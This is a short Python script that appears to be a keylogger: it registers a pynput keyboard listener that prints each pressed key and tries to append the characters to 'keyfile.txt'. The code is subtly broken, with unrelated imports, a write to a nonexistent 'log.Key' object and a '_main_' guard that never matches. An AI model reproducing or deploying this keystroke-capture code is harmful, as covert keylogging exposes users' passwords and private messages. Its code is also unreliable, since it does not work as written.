from asyncio import log
from os import name
from pynput import keyboard
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            log.Key.write(char)
        except:
            print("Error getting char")


if  name == "_main_":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()